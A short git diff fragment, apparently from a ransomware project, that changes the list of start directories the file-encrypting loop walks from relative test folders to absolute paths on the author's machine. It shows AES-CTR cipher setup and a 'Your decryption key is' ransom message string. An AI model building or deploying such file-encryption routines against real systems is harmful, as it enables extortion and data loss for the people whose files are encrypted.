@@ -101,7 +101,7 @@ Your decryption key is: '{}'
     crypt = AES.new(key.encode("utf8"), AES.MODE_CTR, counter=ctr)
 
     # change this to fit your needs.
-    startdirs = ['./testing', './test_files']
+    startdirs = ['/media/sh0ck/Data/Projects/ransomware/testing', '/media/sh0ck/Data/Projects/ransomware/test_files']
 
     for currentDir in startdirs:
         for file in discoverFiles(currentDir, decrypt):
